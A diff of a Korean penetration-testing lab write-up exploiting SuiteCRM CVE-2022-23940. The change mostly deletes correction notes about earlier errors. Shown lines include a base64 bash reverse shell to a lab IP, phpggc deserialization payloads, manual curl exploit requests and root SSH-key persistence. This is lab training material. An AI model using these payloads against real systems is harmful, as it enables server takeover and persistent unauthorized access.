@@ -25,23 +25,6 @@ tech_count: 6
 > **타겟** 192.168.248.146 · **OS** Debian 10 (buster) · **난이도** Intermediate · **플래그** 2개
 > **경로** SuiteCRM 7.12.3 기본자격(admin:admin) → CVE-2022-23940 인증 후 RCE → `www-data` → `sudo service` 경로탈출 → `root`
 
-> [!warning] 적대적 검증 정정 이력 (2026-08-20)
-> 이 노트는 [[_WRITEUP-STANDARD#적대적 검증 — 노트를 쓴 다음 반드시 거친다|적대적 검증]]을 거쳐 12건을 정정했다. 실측 터미널 블록은 훼손되지 않았고, 틀린 것은 전부 나중에 덧붙인 설명 문장이었다. 다시 읽을 때 같은 오해를 반복하지 않도록 요약해둔다.
->
-> | 무엇이 틀렸었나 | 무엇이 사실인가 | 반증 근거 |
-> |---|---|---|
-> | "`rest_data`를 빼면 SuiteCRM이 오류를 낸다" | 필수는 `method` 하나. `rest_data`는 없으면 빈 문자열로 조용히 폴백 | v7.12.3 `SugarRestJSON.php` |
-> | "dash에서 `/dev/tcp: No such file or directory`가 난다" | 실제는 `Syntax error: Bad fd number`. `/dev/tcp`에 도달조차 못 한다 | Kali 실행 |
-> | "`save()`가 base64 디코드 후 `unserialize()`한다" | `save()`는 인코드한다. 진짜 버그는 `is_array()` 타입 검사 우회 → 조회 경로 `get_email_recipients()`의 `unserialize()` | PoC README의 벤더 코드 |
-> | 가젯 체인 최상위 = `BufferHandler` | 최상위는 `SyslogUdpHandler`, `BufferHandler`는 그 `$socket` | `exploit.py:12` 하드코딩 페이로드 |
-> | `/install/` 리스팅·`status.json`·내부 IP `172.16.201.78` | 산출물에 근거 없음. `ferox.log` 1085행에 해당 히트 0건, `install.log`에 `172.16.*` 0건 | `~/PG/Crane/ferox.log`·`install.log` |
-> | "`AOR_Scheduled_Reports`는 관리자만" | 예약 보고서 생성 권한이 있는 임의 계정 | PoC README |
-> | "RST = 방화벽이 없다" | RST는 묵살형(DROP) 차단이 없다까지만 말한다. REJECT 규칙도 RST를 준다 | — |
-> | "공개 PoC는 OSCP 회색지대" | 허용된다. 금지 정의는 "스스로 발견하고 익스플로잇하는" 도구 | OffSec 공식 정의 |
-> | MySQL "`root`가 `localhost`에서만 붙는다" | `mysql.user`를 조회한 적이 없다 → `[가정]`으로 강등 | — |
->
-> 원칙: 이 노트에서 `[가정]` 딱지가 없는 단정은 실측이거나 1차 사료로 확인한 것이다. 딱지가 붙은 것은 확인하지 못했다는 뜻이다.
-
 ## 0. 이 박스에서 배우는 것
 
 - **비인증 엔드포인트로 제품 버전을 확정하는 법** — SuiteCRM은 `/service/v4_1/rest.php`의 `get_server_info`가 인증 없이 버전을 뱉는다. 버전 특정이 곧 CVE 특정이다
@@ -209,20 +192,6 @@ Allow: /ical_server.php
 | `/install.php` | 200 | `installer_locked => true` — 재설치 불가 | `[가정 — 산출물 미보존]` |
 | `/config.php`, `/config_override.php` | 200, 0바이트 | PHP 파싱됨, 유출 없음 | `[가정 — 산출물 미보존]` |
 
-> [!warning] 반증됨 — 여기 원래 세 줄이 더 있었다 (2026-08-20 적대적 검증)
-> 이 노트는 원래 아래 세 항목을 실측인 것처럼 적고 있었다. 산출물이 전부 반박한다.
->
-> | 원래 서술 | 반증 |
-> |---|---|
-> | `/install/` 200, 디렉터리 리스팅 활성 (인스톨러 전체 노출) | `ferox.log` 1085행 전량에 `/install` 히트 0건. 워드리스트 `raft-medium-directories.txt`에는 `install`이 51행에 실재하므로 200이었다면 반드시 찍혔다. 게다가 feroxbuster의 `detected directory listing` 휴리스틱은 같은 스캔에서 `/themes`·`/cache`에 실제로 발화했다 — `/install`에는 발화하지 않았다 |
-> | `/install/status.json` → 내부 IP `172.16.201.78` 누출 | `install.log` 전수 grep에 `172.16.*` 0건. 이 IP는 산출물 어디에도 없다 |
-> | `/upload/` 200, 리스팅 없음 | `ferox.log`에 `/upload` 히트 0건 (워드리스트 88행에 `upload` 실재) |
->
-> 왜 남겨두는가: 지우면 "왜 뒤집혔는지"가 사라져 같은 실수를 반복한다. 그리고 이것 자체가 교훈이다 —
-> 디렉터리 브루트포스 결과를 서술할 때는 로그를 다시 열어라. "인스톨러가 노출돼 있었던 것 같다"는 기억은 CMS 정찰에서 너무 그럴듯해서 검증 없이 통과한다.
->
-> 아래 6장 ③·7장 12번·8장 방어 표에서 이 전제 위에 서 있던 서술도 함께 정정했다.
-
 `/install.log`는 51KB짜리 설치 로그가 그대로 서빙되는 정보 노출이지만, 안에 있는 것은 DB 드라이버 부재 에러와 설치 진행 로그뿐이다. 자격증명은 없어서 사실상 함정에 가깝다.
 
 `/config.php`가 0바이트로 온 것은 나쁜 신호다. PHP 파일을 요청해서 0바이트가 오면 서버가 정상적으로 파싱했다는 뜻이다(출력이 없는 순수 배열 정의 파일이므로). 여기서 **평문이 그대로 보였다면 PHP 핸들러가 죽은 것**이고, 그게 곧 DB 자격증명 유출이다.
@@ -321,7 +290,7 @@ phpggc Monolog/RCE2 system 'id' -b   # base64로 인코딩해서 출력
 `-b` 플래그가 중요하다 — 직렬화 문자열에는 `"`·`;`·`{`·`}`·널바이트가 섞여 HTTP 파라미터로 그냥 넣으면 깨진다. 이 취약점은 애초에 서버가 base64를 기대하므로 `-b`가 그대로 맞물린다.
 
 phpggc는 익스플로잇이 아니라 페이로드 생성기다. 취약한 엔드포인트에 전달하는 일은 직접 해야 하니 msfvenom과 같은 범주이고, OSCP에서 쓸 수 있다. 시험 금지 정의는 *"automatically discovering and exploiting … without effort or enumeration"* 인데 phpggc는 타겟과 통신조차 하지 않는다.
-같은 기준으로 3-2의 `exploit.py`도 허용된다 — 특정 CVE 하나를 겨냥한 PoC는 취약점을 스스로 발견하지 않는다. (이 노트는 원래 `exploit.py`를 "회색지대"로 적어놨었다. 과잉 해석이라 정정했다 — 3-2 참조.)
+같은 기준으로 3-2의 `exploit.py`도 허용된다 — 특정 CVE 하나를 겨냥한 PoC는 취약점을 스스로 발견하지 않는다.
 다만 손으로 재구성할 수 있어야 스크립트가 죽었을 때 살아남는다. 그래서 대안 절차를 함께 적어뒀다.
 
 ### 2-2. 왜 취약한가 — CVE-2022-23940의 데이터 흐름
@@ -428,7 +397,7 @@ a:2:{ i:7;
   i:7;i:7; }
 ```
 
-**최상위는 `BufferHandler`가 아니라 `SyslogUdpHandler`다.** 이 노트는 원래 `BufferHandler::__destruct()`를 진입점으로 그려놨었는데 그건 `Monolog/RCE1` 계열의 모양이다. phpggc의 `gadgetchains/Monolog/RCE/2/chain.php`는 `$vector = '__destruct'` 로 두고 `SyslogUdpHandler`를 최상위에 놓은 뒤 그 `$socket` 프로퍼티에 `BufferHandler`를 담는다. 디스크의 `exploit.py` 페이로드가 정확히 그 모양이다(`O:32:"...SyslogUdpHandler":1:{s:6:"socket";O:29:"...BufferHandler"…`).
+**최상위는 `BufferHandler`가 아니라 `SyslogUdpHandler`다.** phpggc의 `gadgetchains/Monolog/RCE/2/chain.php`는 `$vector = '__destruct'` 로 두고 `SyslogUdpHandler`를 최상위에 놓은 뒤 그 `$socket` 프로퍼티에 `BufferHandler`를 담는다. 디스크의 `exploit.py` 페이로드가 정확히 그 모양이다(`O:32:"...SyslogUdpHandler":1:{s:6:"socket";O:29:"...BufferHandler"…`).
 phpggc는 같은 라이브러리에 RCE1/RCE2/RCE3…를 두고 체인마다 진입 클래스가 다르다. 가젯 체인의 모양은 기억으로 쓰지 말고 디스크의 PoC를 열어 확인한다.
 
 호출이 굴러가는 흐름 `[가정 — 클래스 골격은 위 페이로드로 확정했으나, 아래 메서드 이름과 내부 분기는 Monolog 소스를 이 박스에서 직접 열어 확인하지는 않았다]`:
@@ -491,8 +460,6 @@ echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIwNy80NDQ0IDA+JjE= | base64 -d | 
 > |---|---|---|
 > | ① 문법 파싱 | dash에서 `>&`는 fd 복제 전용이라 `/dev/tcp/...` 같은 파일명을 받지 못한다 | `Syntax error: Bad fd number` — **`/dev/tcp`에 도달조차 못 한다** |
 > | ② 가상 장치 부재 | `>` 하나로 바꿔 문법을 통과시켜도, dash에는 `/dev/tcp` 가상 장치 자체가 없다(bash가 리다이렉션을 가로채 소켓을 여는 기능이지 실제 파일이 아니다) | `cannot create /dev/tcp/...: Directory nonexistent` |
->
-> 이 노트는 원래 `/dev/tcp: No such file or directory` 라고 적어놨었다. 그 문자열은 어느 경우에도 나오지 않는다. 그럴듯하지만 실행해본 적 없는 문구였고, 인과도 뒤집혀 있었다(파싱에서 먼저 죽는데 장치 부재를 원인으로 적었다).
 >
 > 결론은 그대로다 — 마지막 파이프가 반드시 **`| bash`** 여야 한다. `system()`이 내부적으로 `/bin/sh -c`를 쓰기 때문에, `bash`로 명시적으로 넘기는 이 한 겹이 없으면 셸이 안 붙는다.
 > 리버스셸이 안 붙을 때 의심 순서: ① 아웃바운드 포트 차단 → ② `sh` vs `bash` → ③ `/dev/tcp` 미지원 빌드(`--disable-net-redirections`로 컴파일된 bash) → ④ IP/포트 오타. ②가 가장 흔하고 가장 늦게 발견된다.
@@ -593,7 +560,7 @@ YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIwNy80NDQ0IDA+JjE=
 INFO:CVE-2022-23940:Login did work - Trying to create scheduled report
 ```
 
-**공개 PoC 스크립트는 시험에서 허용된다.** 이 노트는 원래 `exploit.py`를 "OSCP 자동 익스플로잇 도구 금지에 걸릴 소지"로 적어놨었는데 과잉 해석이었다. OffSec의 금지 정의는 이렇다:
+**공개 PoC 스크립트는 시험에서 허용된다.** OffSec의 금지 정의는 이렇다:
 
 > *"if a tool is capable of automatically discovering and exploiting vulnerabilities on a target machine resulting in automatic remote access … without effort or enumeration"* — 열거된 예: `db_autopwn` · `browser_autopwn` · SQLmap · SQLninja
 
@@ -630,8 +597,8 @@ curl -sS -b cookies.txt \
 # ⑤ 리스너 확인
 ```
 
-**`name`·`status`·`schedule_type`을 빼면 레코드 생성이 실패한다.** 이 노트는 원래 `module`·`action`·`email_recipients` 3개만 적어놨었고, 그대로 따라 하면 재현이 안 된다. `exploit.py`가 실제로 보내는 것은 6개 필드에 `Referer` 헤더까지다. `Referer`는 SuiteCRM의 요청 출처 검사를 통과하기 위한 것이다.
-원래 있던 "폼 필드명은 실제 저장 폼을 브라우저로 열어 확인해야 한다"는 문장도 삭제했다 — PoC 소스에 이미 다 있다. 브라우저를 켜기 전에 `exploit.py`를 연다.
+**`name`·`status`·`schedule_type`을 빼면 레코드 생성이 실패한다.** `exploit.py`가 실제로 보내는 것은 6개 필드에 `Referer` 헤더까지다. `Referer`는 SuiteCRM의 요청 출처 검사를 통과하기 위한 것이다.
+브라우저를 켜기 전에 `exploit.py`를 연다.
 
 ③에서 이미 셸이 붙는다. Save 응답을 렌더하면서 서버가 방금 저장한 레코드를 다시 읽고, 그 조회 경로가 `get_email_recipients()` → `unserialize()` 이기 때문이다(2-2 참조). ④의 `action=run`까지 갈 필요조차 없다 — 6장 ②의 "행 착시"가 이것이다.
 
@@ -782,7 +749,7 @@ DB가 `root` / 빈 패스워드지만 이미 시스템 root라 추가 활용은 
 
 **이 자격증명은 외부에서 못 쓴다.** nmap이 `3306/tcp MySQL (unauthorized)`를 낸 직접 원인은 내 접속 호스트가 `mysql.user`의 어떤 `user@host` 행과도 매칭되지 않았다는 것이다.
 `root@localhost`만 존재했을 가능성이 높지만 `[가정]` — `SELECT user,host FROM mysql.user`를 조회하지는 않았다. `config.php`의 `db_host_name => 'localhost'`는 앱이 접속하는 주소일 뿐 서버측 호스트 ACL이 아니다. 둘을 같은 것으로 읽으면 안 된다.
-(1장 nmap 해설표는 이 구분을 지켜 "내 IP가 `mysql.user` 호스트 목록에 없다"로 써놨다. 여기서 "`localhost`에서만 붙는다"로 단정했던 것을 되돌린 것이다.)
+(1장 nmap 해설표는 이 구분을 지켜 "내 IP가 `mysql.user` 호스트 목록에 없다"로 써놨다.)
 DB 자격증명을 얻었는데 원격 접속이 거부되면 ① 호스트 제한(`user@localhost`) ② bind-address 를 의심하고, SSH 포트포워딩(`ssh -L 3306:127.0.0.1:3306`)이나 이미 잡은 웹셸을 경유한다.
 이 값의 진짜 가치는 패스워드 재사용 쪽이다 — 얻은 비밀번호로 SSH·다른 서비스를 다시 시도한다. (이 박스는 빈 문자열이라 무의미)
 
@@ -879,11 +846,6 @@ INFO:CVE-2022-23940:Login did work - Trying to create scheduled report
 | `/config.php`, `/config_override.php` | 0바이트. PHP가 정상 파싱함, 유출 없음 | `[가정 — 산출물 미보존]` |
 
 설치 로그 노출은 실제 침투 테스트에서는 보고 가치가 있는 정보 노출이지만, **이 박스에서는 피벗할 대상이 아니었다.**
-
-> [!warning] 정정 — 원래 여기 "디렉터리 리스팅"과 "내부 IP"가 적혀 있었다
-> 원문: *"디렉터리 리스팅이 켜진 `/install/`, 내부 IP가 박힌 `status.json`"* / *"`/install/status.json` | 내부 IP `172.16.201.78` 하나. 접근 불가, 활용처 없음"*
-> 둘 다 산출물이 반박한다 — `ferox.log`에 `/install` 히트 0건, `install.log` 전수 grep에 `172.16.*` 0건. (1장 열거 절의 "반증됨" 표 참조)
-> 이 항목이 시행착오 장에 있었다는 것이 특히 위험했다. **"실제 겪음"이라고 라벨링된 서술은 검증 없이 통과하기 쉽다.** 라벨이 사실을 만들지 않는다.
 
 인스톨러 잔존물·설치 로그·디렉터리 리스팅·내부 IP 누출은 정보 노출 보고서 항목이지 반드시 익스플로잇 경로는 아니다(이 박스에서 실제로 확인된 것은 `install.log` 하나다). **열려 보이는 것과 길은 다르다.**
 그래서 손절 기준을 미리 정해둔다 — 인스톨러 계열은 `installer_locked`(SuiteCRM/SugarCRM)·`installed.lock`(Nextcloud)·`CONFIG_FILE 존재 여부`(WordPress)를 한 번만 확인하고, 잠겨 있으면 5분 안에 접는다. 이 박스에서는 접는 판단이 옳았고, 정답은 이미 손에 있던 버전 정보였다.
@@ -1016,7 +978,7 @@ mkdir -p /root/.ssh && echo '<내 공개키>' >> /root/.ssh/authorized_keys
 5. **공개 PoC 스크립트(`exploit.py`)는 시험에서 허용된다.** OSCP 금지 정의는 *"automatically discovering and exploiting"* — 스스로 취약점을 찾는 도구(`db_autopwn`·`browser_autopwn`·SQLmap·SQLninja)를 겨냥한다. 특정 CVE 하나를 겨냥한 PoC는 네가 열거해서 정해준 뒤에야 동작하므로 해당되지 않는다. 애초에 exploit-db 사용을 전제로 만든 시험이다.
    - 판단 기준은 "금지냐"가 아니라 "스크립트가 죽으면 이어갈 수 있느냐"다. 버전이 조금만 달라도 공개 PoC는 조용히 실패한다.
    - 수동 대안 (필드는 `exploit.py` 소스에서 그대로 환원): ① `curl -c cookies.txt`로 로그인 → ② `phpggc Monolog/RCE2 system '<cmd>' -b` → ③ `curl -b cookies.txt -X POST .../index.php -H 'Referer: http://TARGET' --data-urlencode 'module=AOR_Scheduled_Reports' --data-urlencode 'action=Save' --data-urlencode 'name=test' --data-urlencode 'status=active' --data-urlencode 'schedule_type=monthly' --data-urlencode 'email_recipients=<페이로드>'` → ④ 리스너 확인
-   - **`name`·`status`·`schedule_type`·`Referer`를 빼면 레코드 생성이 실패한다.** 3-2의 수동 절차가 원래 3개 필드만 적어놨던 것을 정정했다.
+   - **`name`·`status`·`schedule_type`·`Referer`를 빼면 레코드 생성이 실패한다.**
    - PoC를 쓰더라도 반드시 소스를 열어 "어떤 HTTP 요청을 보내는가"를 읽어라. 그게 곧 수동 절차이고, 스크립트가 죽었을 때의 유일한 디버깅 수단이다.
 6. **PHP 역직렬화의 신호를 외워라.** `unserialize(` · `base64_decode` 를 거친 사용자 입력 · `O:8:"..."` 로 시작하는 쿠키/파라미터 값 · `phpggc` 대상 라이브러리(`vendor/monolog`, `vendor/guzzlehttp`)의 존재. 하나라도 보이면 POP 체인을 의심한다. 다른 언어 대응물: Java `readObject`(ysoserial) · Python `pickle.loads` · Ruby `Marshal.load` · .NET `BinaryFormatter`.
 7. **`system()`은 `/bin/sh -c`로 실행된다.** 데비안의 `sh`는 dash이고, dash는 두 층에서 리버스셸을 죽인다 — ① `>&`를 fd 복제로만 해석해 `Syntax error: Bad fd number`, ② `>` 하나로 바꿔도 `/dev/tcp` 가상 장치가 없어 `cannot create /dev/tcp/...: Directory nonexistent`. 그래서 리버스셸은 반드시 `| bash` 로 넘긴다. 안 붙을 때 가장 먼저 의심할 항목.
@@ -1025,7 +987,6 @@ mkdir -p /root/.ssh && echo '<내 공개키>' >> /root/.ssh/authorized_keys
 10. **플래그는 위치를 추측하지 말고 이름으로 찾는다.** `find / -name local.txt 2>/dev/null`. `/home`이 비었다고 "수평 이동이 남았다"고 단정하지 않는다 — 서비스 계정만 있는 구성에서는 `/var/www`에 놓인다.
 11. **200 응답이 성공이 아니다.** `"Not A Valid Entry Point"`(23바이트)가 200으로 나온다. 디렉터리 브루트포스 결과는 상태코드가 아니라 길이로 1차 분류한다.
 12. **인스톨러 잔존물(`/install.log` 51KB)은 함정이었다** — 설치 로그 전문이 그대로 서빙되지만 안에 있는 것은 DB 드라이버 부재 에러뿐, 자격증명은 없다. 열려 보인다고 다 길은 아니다. 5분 상한을 걸고 접어라.
-    - 이 항목은 원래 *"`/install/` 디렉터리 리스팅과 내부 IP 누출(`172.16.201.78`)"* 로 적혀 있었으나 **산출물이 반박했다**(`ferox.log`·`install.log` 전수 확인). 1장의 "반증됨" 표 참조. 정찰 산출물을 다시 열지 않고 기억으로 쓴 서술이 어떻게 굳는지의 사례로 남겨둔다.
 13. **DB 자격증명을 얻어도 원격에서 못 쓸 수 있다.** nmap의 `MySQL (unauthorized)`가 그 예고편이다. 호스트 제한이 걸렸으면 SSH 포트포워딩이나 이미 확보한 웹셸을 경유한다. 그리고 얻은 비밀번호는 다른 서비스에 재사용부터 시도한다.
 
 > [!tip] 시험 반사 체크 — 이 박스로 답이 채워지는가
